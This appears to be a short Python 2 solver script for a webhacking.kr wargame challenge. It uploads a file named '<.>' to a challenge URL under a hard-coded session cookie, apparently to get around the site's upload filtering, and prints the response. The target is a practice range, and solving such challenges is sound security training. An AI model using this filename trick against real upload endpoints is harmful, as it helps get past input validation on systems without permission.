import requests

url='http://webhacking.kr/challenge/web/web-19/dkanehdkftndjqtsmsdlfmadmlvhfejzzzzzzzzzkkkkkkkkggggggggg/done'
files={'up':('<.>',open('done','rb'),'multipart/form-data')}
cookies={'PHPSESSID':'1gvdu8mjh0miihv90idtg3djj3'}

response=requests.post(url, files=files, cookies=cookies)
print response.text
